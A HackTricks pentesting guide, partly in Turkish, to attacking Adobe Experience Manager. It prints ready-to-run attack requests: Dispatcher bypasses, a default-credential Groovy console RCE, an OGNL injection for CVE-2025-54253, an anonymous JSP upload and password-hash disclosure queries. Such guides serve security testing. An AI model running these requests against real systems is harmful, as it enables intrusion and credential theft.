# AEM (Adobe Experience Manager) Pentesting

{{#include ../../banners/hacktricks-training.md}}

> Adobe Experience Manager (AEM, part of the Adobe Experience Cloud) enterprise bir CMS'dir ve Apache Sling/Felix (OSGi) ile Java Content Repository (JCR) üzerinde çalışır.
> Bir attacker bakış açısından, AEM instances çok sık tehlikeli development endpoints, zayıf Dispatcher kuralları, default credentials ve her çeyrekte yamalanan uzun bir CVEs kuyruğu barındırır.

Aşağıdaki kontrol listesi gerçek engagements (2022-2026) sırasında tekrar tekrar görülen **externally reachable (unauth) attack surface** üzerine odaklanır.

---

## 1. Fingerprinting
```
$ curl -s -I https://target | egrep -i "aem|sling|cq"
X-Content-Type-Options: nosniff
X-Dispatcher: hu1            # header added by AEM Dispatcher
X-Vary: Accept-Encoding
```
Diğer hızlı göstergeler:
* `/etc.clientlibs/` statik yol mevcut (JS/CSS döndürür).
* `/libs/granite/core/content/login.html` giriş sayfası ve “Adobe Experience Manager” banner'ı.
* `</script><!--/* CQ */-->` HTML'in en altında bir yorum.

---

## 2. Yüksek değerli kimlik doğrulama gerektirmeyen endpoint'ler

Path | Ne elde edersiniz | Notlar
---- | ------------- | -----
`/.json`, `/.1.json` | DefaultGetServlet aracılığıyla JCR node'ları | Çoğunlukla engellenir, fakat *Dispatcher bypass* (aşağıya bak) çalışır.
`/bin/querybuilder.json?path=/` | QueryBuilder API | Sayfa ağacı, iç yollar ve kullanıcı adlarının leak olması.
`/system/console/status-*`, `/system/console/bundles` | OSGi/Felix console | Varsayılan olarak 403; eğer erişilebilirse ve kimlik bilgileri bulunursa ⇒ bundle-upload ile RCE.
`/crx/packmgr/index.jsp` | Package Manager | Yetkilendirilmiş içerik paketleri aracılığıyla JSP payload yüklemeye izin verir.
`/etc/groovyconsole/**` | AEM Groovy Console | Eğer erişilebilirse → keyfi Groovy / Java çalıştırma.
`/libs/cq/AuditlogSearchServlet.json` | Audit logs | Bilgi sızıntısı.
`/libs/cq/ui/content/dumplibs.html` | ClientLibs dump | XSS vector.
`/adminui/debug` | **AEM Forms on JEE** Struts dev-mode OGNL evaluator | Yanlış yapılandırılmış Forms kurulumlarında (CVE-2025-54253) bu endpoint kimlik doğrulama gerektirmeyen OGNL çalıştırır → RCE.

### Dispatcher bypass tricks (2025/2026'da hâlâ çalışıyor)
Çoğu prodüksiyon sitesi *Dispatcher* (reverse-proxy) arkasındadır. Filtre kuralları sıkça kodlanmış karakterlerin veya izin verilen statik uzantıların kötüye kullanılmasıyla atlatılır.

*Klasik noktalı virgül + izin verilen uzantı*
```
GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1
```
*Encoded slash bypass (2025 KB ka-27832)*
```
GET /%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType HTTP/1.1
```
Eğer Dispatcher kodlanmış eğik çizgilere izin veriyorsa, bu `/bin` varsayılan olarak engellenmiş olsa bile JSON döndürür.

---

## 3. Common misconfigurations (still alive in 2026)

1. **Anonymous POST servlet** – `POST /.json` ile `:operation=import` yeni JCR düğümleri eklemenizi sağlar. Dispatcher'da `*.json` POST'larını engellemek bunu düzeltir.
2. **World-readable user profiles** – varsayılan ACL herkes için `/home/users/**/profile/*` üzerinde `jcr:read` izni verir.
3. **Default credentials** – `admin:admin`, `author:author`, `replication:replication`.
4. **WCMDebugFilter** etkin ⇒ `?debug=layout` ile reflected XSS (CVE-2016-7882, hâlâ eski 6.4 kurulumlarında bulunuyor).
5. **Groovy Console exposed** – bir Groovy script göndererek remote code execution:
```bash
curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json
```
6. **Dispatcher encoded-slash gap** – yol filtreleriyle engellense bile `%2f`/`%3B` ile `/bin/querybuilder.json` ve `/etc/truststore.json` erişilebilir.
7. **AEM Forms Struts devMode left enabled** – `/adminui/debug?expression=` kimlik doğrulama olmadan OGNL'yi değerlendirir (CVE-2025-54253) ve yetkisiz RCE'ye yol açar; Forms gönderimindeki eşleşen XXE (CVE-2025-54254) dosya okuma izni verir.

---

## 4. Recent vulnerabilities (service-pack cadence)

Quarter | CVE / Bulletin | Affected | Impact
------- | --- | -------- | ------
Dec 2025 | **APSB25-115**, CVE-2025-64537/64539 | 6.5.24 & earlier, Cloud 2025.12 | Multiple critical/stored XSS → code execution via author UI.
Sep 2025 | APSB25-90 | 6.5.23 & earlier | Security feature bypass chain (Dispatcher auth checker) – upgrade to 6.5.24/Cloud 2025.12.
Aug 2025 | **CVE-2025-54253 / 54254** (AEM Forms JEE) | Forms 6.5.23.0 and earlier | DevMode OGNL RCE + XXE file read, unauthenticated.
Jun 2025 | APSB25-48 | 6.5.23 & earlier | Stored XSS and privilege escalation in Communities components.
Dec 2024 | APSB24-69 (rev. Mar 2025 adds CVE-2024-53962…74) | 6.5.22 & earlier | DOM/Stored XSS, arbitrary code exec (low-priv).
Dec 2023 | APSB23-72 | ≤ 6.5.18 | DOM-based XSS via crafted URL.

Müşterinin service-pack'iyle eşleşen *APSB* bültenini her zaman kontrol edin ve en son **6.5.24 (Nov 26, 2025)** veya **Cloud Service 2025.12** için baskı yapın. AEM Forms on JEE kendi add-on hotfix'ine ihtiyaç duyar **6.5.0-0108+**.

---

## 5. Exploitation snippets

### 5.1 RCE via dispatcher bypass + JSP upload
If anonymous write is possible:
```
# 1. Create a node that will become /content/evil.jsp
POST /content/evil.jsp;%0aa.css HTTP/1.1
Content-Type: application/x-www-form-urlencoded

:contentType=text/plain
jcr:data=<% out.println("pwned"); %>
:operation=import
```
Şimdi `/content/evil.jsp` isteğinde bulunun – JSP, AEM işlem kullanıcısı olarak çalışır.

### 5.2 SSRF to RCE (historical < 6.3)
`/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console`
`aem_ssrf2rce.py` **aem-hacker**'ten tüm zinciri otomatikleştirir.

### 5.3 OGNL RCE on AEM Forms JEE (CVE-2025-54253)
```
# Unauth devMode OGNL to run whoami
curl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start(),%23out=new%20java.io.InputStreamReader(%23p.getInputStream()),%23br=new%20java.io.BufferedReader(%23out),%23br.readLine()"
```
Eğer zafiyete sahipse, HTTP gövdesi komut çıktısını içerir.

### 5.4 QueryBuilder hash disclosure (encoded slash bypass)
```
GET /%2fbin%2fquerybuilder.json?path=/home&type=rep:User&p.hits=full&p.nodedepth=2&p.offset=0 HTTP/1.1
```
Anonim read ACL'leri varsayılan olduğunda kullanıcı node'larını `rep:password` hash'leri dahil olmak üzere döndürür.

---

## 6. Araçlar

* **aem-hacker** – Çok amaçlı enumeration script'i; dispatcher bypass, SSRF detection, default-creds kontrolleri ve daha fazlasını destekler.
```bash
python3 aem_hacker.py -u https://target --host attacker-ip
```
* **Tenable WAS plugin 115065** – Detects QueryBuilder hash disclosure & encoded-slash bypass'ı otomatik olarak tespit eder (yayınlandı Aralık 2025).
* **Content brute-force** – gizli bileşenleri keşfetmek için `/_jcr_content.(json|html)`'i özyinelemeli olarak isteyin.
* **osgi-infect** – creds mevcutsa `/system/console/bundles` üzerinden kötü amaçlı OSGi bundle'ı yükler.


## Referanslar

* [Adobe Security Bulletin APSB25-115 – Security updates for Adobe Experience Manager (Dec 9, 2025)](https://helpx.adobe.com/security/products/experience-manager/apsb25-115.html)
* [BleepingComputer – Adobe issues emergency fixes for AEM Forms zero-days (Aug 5, 2025)](https://www.bleepingcomputer.com/news/security/adobe-issues-emergency-fixes-for-aem-forms-zero-days-after-pocs-released/)
{{#include ../../banners/hacktricks-training.md}}
